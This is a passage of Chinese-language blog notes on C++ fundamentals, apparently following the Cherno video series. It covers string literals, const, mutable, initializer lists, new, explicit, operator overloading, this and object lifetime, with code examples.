class="number">8</span>] = <span class="string">&quot;JK\0A&quot;</span>;  <span class="comment">// &quot;JK&quot;后面跟一个结束标志\0, 再跟一个字母&#x27;A&#x27;</span></span><br><span class="line">  std::cout &lt;&lt; <span class="built_in">strlen</span>(name) &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>cout 对于 wchar_t* , char16_t*, char32_t* ，都只会输出首地址， 如果想要输出 wchar_t* 的内容，那么需要用 std::wcout 。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* name = <span class="string">u8&quot;JKA&quot;</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">wchar_t</span>* name2 = <span class="string">L&quot;JKA&quot;</span>;  <span class="comment">// 宽字符:不同环境字节数不同,windows下2字节,Linux下4字节</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char16_t</span>* name3 = <span class="string">u&quot;JKA&quot;</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">char32_t</span>* name4 = <span class="string">U&quot;JKA&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">  std::wcout &lt;&lt; name2 &lt;&lt; std::endl;  <span class="comment">// std::wcout</span></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多行字符串的等价写法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* exp = <span class="string">R&quot;(Line1</span></span><br><span class="line"><span class="string">Line2</span></span><br><span class="line"><span class="string">Line3</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; exp &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* exp2 = <span class="string">&quot;Line4\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Line5\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Line6\n&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; exp2 &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="33-CONST-in-C">33 CONST in C++</h1><p>const是限定符，是伪关键字，因为它在改变生成代码方面什么也做不了。const有点像类和结构体的可见性，就像承诺——可以绕过或打破，这个承诺实际上可以简化很多代码。</p><blockquote><p>💡 个人理解：const就像承诺，限制某个引用为const只是说通过这个引用不能改变，但可以存在其他内存别名是非const的，通过其他方式就能进行读写。</p></blockquote><h2 id="用法1：放在变量前面">用法1：放在变量前面</h2><h2 id="用法2：-与指针组合">用法2： 与指针组合</h2><p><code>int const*</code> 和<code>const int*</code> 相同，在<em>前，能够让指针指向内容不能被修改（底层const）。<br>如果要让指针本身成为常量，需要放到</em>后（顶层const)。**</p><ul><li><code>const int* a = new int;</code> 和 <code>int const* a = new int;</code>只是不能改变指针指向的内容，但是可以改变指针本身 <code>a = （int*)&amp;MAX_AGE;</code></li><li><code>int* const a = new int;</code> 正好相反，可以改变指针指向的内容<code>*a = 2;</code>，但是不能把指针重新赋值。</li><li><code>const int* const a = new int;</code> 二者都无法修改。</li></ul><blockquote><p>💡 这里更建议阅读《C++ Primer 第5版》P56，从右向左阅读，看const限定符距离指针变量更近，还是距离基本数据类型更近。理解后，可以发现这与Cherno讲的本质上是一样的。</p></blockquote><h2 id="用法3：getter与setter">用法3：getter与setter</h2><p><strong>getter</strong>：将const 放在方法名的右边（只在类中有效），表示这个方法不会修改任何实际的类——只能读不能写，因此不能修改成员变量。</p><p><strong>在类中，如果它们实际上没有修改类或者它们不应该修改类，应该总是将方法声明为const</strong>——否则在有常量引用或则类似的情况下，就用不了你的方法。</p><p>mutable允许getter（常量方法）修改变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> m_X, m_Y;</span><br><span class="line">  <span class="keyword">mutable</span> <span class="type">int</span> var;  <span class="comment">// mutabl使得const方法中仍然可修改此变量</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetX</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    var = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> m_X;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">SetX</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    m_X = x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintEntity</span><span class="params">(<span class="type">const</span> Entity&amp; e)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; e.<span class="built_in">GetX</span>() &lt;&lt; std::endl;  <span class="comment">// GetX()必须为const，否则会修改Entity</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity e;</span><br><span class="line">  <span class="type">const</span> <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>;  <span class="comment">// 底层const</span></span><br><span class="line">  a = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="comment">//*a = 1;  // const 放*前就不能修改指针指向内容，但可改指针本身</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="34-The-Mutable-Keyword-in-C">34 The Mutable Keyword in C++</h1><p>mutable（可改变的，immutable意为不可改变的   ）实际上有两种不同的用途：</p><ol><li>修饰class中class成员变量，使其在const方法中可修改。（常用）</li><li>修饰lambda表达式，值捕获时可以直接操作传入参数。注意并非意味着引用捕获，依旧值捕获，不修改原值。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  <span class="keyword">mutable</span> <span class="type">int</span> m_DebugCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">const</span> std::string&amp; <span class="title">GetName</span><span class="params">()</span> <span class="type">const</span> </span>&#123;  <span class="comment">// main中有const Entity则这里必须为const</span></span><br><span class="line">    ++m_DebugCount;</span><br><span class="line">    <span class="keyword">return</span> m_Name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> Entity e;</span><br><span class="line">  e.<span class="built_in">GetName</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> x = <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">auto</span> f = [=]() &#123;  <span class="comment">// 按值传递，mutable声明后方可修改（按引用传递不用加）</span></span><br><span class="line">    ++x;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">f</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="35-Member-Initializer-Lists-in-C-Constructor-Initializer-List">35 Member Initializer Lists in C++ (Constructor Initializer List)</h1><p><strong>构造函数初始化列表的顺序要与成员变量声明时的顺序一致</strong>，否则编译器会报警告，编译器是按照变量定义时顺序去初始化的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> m_Score;</span><br><span class="line">  std::string m_Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>()</span><br><span class="line">    : <span class="built_in">m_Score</span>(<span class="number">0</span>), <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">const</span> std::string&amp; name)</span><br><span class="line">    : <span class="built_in">m_Score</span>(<span class="number">0</span>), <span class="built_in">m_Name</span>(name) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">const</span> std::string&amp; <span class="title">GetName</span><span class="params">()</span> <span class="type">const</span> </span>&#123;  <span class="comment">// main中有const Entity则这里必须为const</span></span><br><span class="line">    <span class="keyword">return</span> m_Name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> Entity e;</span><br><span class="line">  std::cout &lt;&lt; e.<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">  <span class="function"><span class="type">const</span> Entity <span class="title">e1</span><span class="params">(<span class="string">&quot;JKA&quot;</span>)</span></span>;</span><br><span class="line">  std::cout &lt;&lt; e1.<span class="built_in">GetName</span>() &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该尽可能使用成员初始化列表。</p><p>好处：除了让函数更简洁（构造函数体里不用写杂乱的成员变量初始化），还有功能上的区别：不使用的话会导致<strong>成员变量被定义两次</strong>，浪费性能，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Example</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Example</span>(<span class="type">const</span> <span class="type">int</span> x) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Created Entity with &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  Example exp;  <span class="comment">// 定义语句也会执行</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>()</span><br><span class="line">    : <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>) &#123;</span><br><span class="line">    exp = <span class="built_in">Example</span>(<span class="number">8</span>);  <span class="comment">// 舍弃成员变量区域定义的Example，并创建一个性Example对象</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> Entity e;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">Created Entity!</span><br><span class="line">Created Entity with <span class="number">8</span></span><br></pre></td></tr></table></figure><p>应该将所有的成员变量初始化放在成员变量初始化列表中：<code>: exp(8), m_Name(&quot;Unknown&quot;)</code> 或<code>: exp(Example(8)), m_Name(&quot;Unknown&quot;)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  Example exp;  <span class="comment">// 定义语句也会执行</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>()</span><br><span class="line">    : <span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>), <span class="built_in">exp</span>(<span class="number">8</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="36-Ternary-Operators-in-C-Conditional-Assignment">36 Ternary Operators in C++ (Conditional Assignment)</h1><p>三目运算符。</p><h1 id="37-How-to-CREATE-INSTANTIATE-OBJECTS-in-C">37 How to CREATE/INSTANTIATE OBJECTS in C++</h1><p>两种创建对象的区别是 在哪块内存创建对象，<strong>尽量用栈 ——</strong> 1.性能：堆内存分配时间长；2.堆上对象需要手动释放；但是栈通常小，比如1~2M，如果放不下就得放堆上。</p><ul><li>栈 <code>Entity entity;</code> 就可以了，会自动调用构造函数 或 <code>Entity entity = Entity(”JKA”);</code> 或者<code>Entity entity(”JKA”)</code> 。<br>生存周期内存在，生存周期不一定是函数，还可以是if或空，即<code>&#123;&#125;</code> 。</li><li>堆 <code>Entity *entity = new Entity(”JKA”);</code> 。</li></ul><p>即使写一个完全为空的类，类中没有成员，也至少需要占用一个字节的内存。</p><h1 id="38-The-NEW-Keyword-in-C">38 The NEW Keyword in C++</h1><p>new时会向OS要一块n字节的连续内存区域，OS找到后返回指针。<br><code>int *pa = new int;</code> 或 <code>int *pa = new int[20];</code><br>Entity* e = new Entity() 的数组版本：<code>Entity* e = new Entity[50];</code></p><p>空闲列表：维护有空闲字节的地址。</p><p>new是一个操作符，这意味着可以重载运算符改变其行为。</p><p>调用new = <strong>调用隐藏其中的c函数 + 执行构造函数</strong>，<code>Entity* e = new Entity();</code> 等价于 <code>Entity* e = (Entity*)malloc(sizeof(Entity)); + 执行构造函数;</code> ，在C++中不应该写后者。</p><p>用 new 必须配套用delete 或 delete[]。</p><p><strong>placement new:</strong> <code>Entity* e = new(b) Entity();</code> 指定new的地址是使用变量b的地址。</p><h1 id="39-Implicit-Conversion-and-the-Explicit-Keyword-in-C">39 Implicit Conversion and the Explicit Keyword in C++</h1><p>C++允许编译器对代码执行<strong>一次</strong>隐式转换（隐式构造函数），而不需要用cast做强制转换。</p><p>explicit关键字放在构造函数前，意味着没有隐式的转换，必须显式调用构造函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string m_Name;</span><br><span class="line">  <span class="type">int</span> m_Age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">const</span> std::string&amp; name)</span><br><span class="line">    : <span class="built_in">m_Name</span>(name), <span class="built_in">m_Age</span>(<span class="number">-1</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Entity</span><span class="params">(<span class="type">const</span> <span class="type">int</span> age)</span></span></span><br><span class="line"><span class="function">    : m_Name(<span class="string">&quot;Unknown&quot;</span>), m_Age(age) &#123;</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//Entity a = &quot;JKA&quot;;  // 不行: 从const char到string再到Entity需要2次转换</span></span><br><span class="line">  Entity a = std::<span class="built_in">string</span>(<span class="string">&quot;JKA&quot;</span>);</span><br><span class="line">  <span class="comment">//Entity b = 22;  // 不行: 加上explicit后就不能用了哟</span></span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="40-OPERATORS-and-OPERATOR-OVERLOADING-in-C">40 OPERATORS and OPERATOR OVERLOADING in C++</h1><p>运算符是一种通常代替一个函数执行一些事情的符号。<code>.</code> <code>()</code> <code>new</code> <code>delete</code> 实际上都是是运算符，运算符实际就是函数。<br>尽量少用 运算符重载，除非确实适合。</p><p>重载本质是给运算符重载赋予新的含义。允许在程序中定义或更改运算符的行为，这在Java中不支持，C#中部分支持，而在C++中拥有完全的控制权。</p><p><strong>运算符重载写在类里是成员函数，也可以写在类外做普通函数，参数不一样。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector2</span> &#123;</span><br><span class="line">  <span class="type">float</span> x, y;</span><br><span class="line">  <span class="built_in">Vector2</span>(<span class="type">float</span> x, <span class="type">float</span> y)</span><br><span class="line">    : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Vector2 <span class="title">Add</span><span class="params">(<span class="type">const</span> Vector2&amp; other)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Vector2</span>(x + other.x, y + other.y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Vector2 <span class="keyword">operator</span>+(<span class="type">const</span> Vector2&amp; other) <span class="type">const</span> &#123;  <span class="comment">// 可以调用普通函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Add</span>(other);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Vector2 <span class="title">Multiply</span><span class="params">(<span class="type">const</span> Vector2&amp; other)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">//return operator*(other);  // 也可</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span> * other;  <span class="comment">// 普通函数也能调用 运算符重载函数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Vector2 <span class="keyword">operator</span>*(<span class="type">const</span> Vector2&amp; other) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Vector2</span>(x * other.x, y * other.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运算符重载既可以放类内，也可以放类外</span></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> Vector2&amp; other) &#123;</span><br><span class="line">  stream &lt;&lt; other.x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; other.y;</span><br><span class="line">  <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">Vector2 <span class="title">position</span><span class="params">(<span class="number">4.0f</span>, <span class="number">4.0f</span>)</span></span>;</span><br><span class="line">  <span class="function">Vector2 <span class="title">speed</span><span class="params">(<span class="number">0.5f</span>, <span class="number">1.5f</span>)</span></span>;</span><br><span class="line">  <span class="function">Vector2 <span class="title">powerup</span><span class="params">(<span class="number">1.1f</span>, <span class="number">1.1f</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  Vector2 res1 = position.<span class="built_in">Add</span>(speed.<span class="built_in">Multiply</span>(powerup));</span><br><span class="line">  Vector2 res2 = position + speed * powerup;</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; res2 &lt;&lt; std::endl;  <span class="comment">// Vector2无法直接输出，需要重载&lt;&lt; 或 to_string</span></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Out ---</span></span><br><span class="line"><span class="number">4.55</span> <span class="number">5.65</span></span><br></pre></td></tr></table></figure><blockquote><p>💡 思考：为啥将operator+() 参数中const去掉后会报错：<br>error C2679: 二元“+”: 没有找到接受“Vector2”类型的右操作数的运算符(或没有可接受的转换)<br>error C2512: “Vector2”: 没有合适的默认构造函数可用？</p><p>原因：根据《C++ Primer 第5版》P202，函数的返回类型决定函数调用是否是左值，调用一个返回引用的函数得到左值，其他返回类型得到右值。<br>这里<em>返回的就是右值，而+若设置参数为非常量引用，则不能接受右值。<br>扩展：可以执行<code>Vector2 tmp = speed * powerup;</code> 然后再 <code>tmp.x++;</code>，这是因为虽然</em>返回的是右值，但tmp是根据此右值初始化了一个变量。</p></blockquote><h1 id="41-The-“this”-keyword-in-C">41 The “this” keyword in C++</h1><p>通过this关键字可以访问成员函数，可以在成员函数中使用this，this是一个指向当前对象实例的<strong>指针</strong>，访问成员变量时使用<code>-&gt;</code>，而非<code>.</code>。</p><blockquote><p>💡 this关键字存在的理由就是 <strong>不用每个对象都要申请空间去保存函数的声明和定义，只需要在类中保存一次，然后调用函数的时候传入不同的this就可以了。</strong></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintEntity</span><span class="params">(Entity* e)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">int</span> x, y;</span><br><span class="line">  <span class="built_in">Entity</span>(<span class="type">int</span> x, <span class="type">int</span> y) &#123;  <span class="comment">// 参数与类成员变量同名</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;x = x;  <span class="comment">// this是指针</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">    <span class="built_in">PrintEntity</span>(<span class="keyword">this</span>);  <span class="comment">// 传入当前对象指针</span></span><br><span class="line">    </span><br><span class="line">    Entity&amp; e = *<span class="keyword">this</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetX</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> Entity &amp;e = *<span class="keyword">this</span>;  <span class="comment">// 函数中需要声明为const，防止修改e</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintEntity</span><span class="params">(Entity* e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Printing</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面例子中，如果用函数初始化列表就不用写this。</p><h1 id="42-Object-Lifetime-in-C-Stack-Scope-Lifetimes">42 Object Lifetime in C++ (Stack/Scope Lifetimes)</h1><p>在局部创建数组是一个典型的错误，一旦函数结束就超出了作用域。</p><p>目的：想在堆上分配，但在超出作用域时自动删除。<br>操作：使用标准库中**unique_ptr，**或自己实现作用域指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 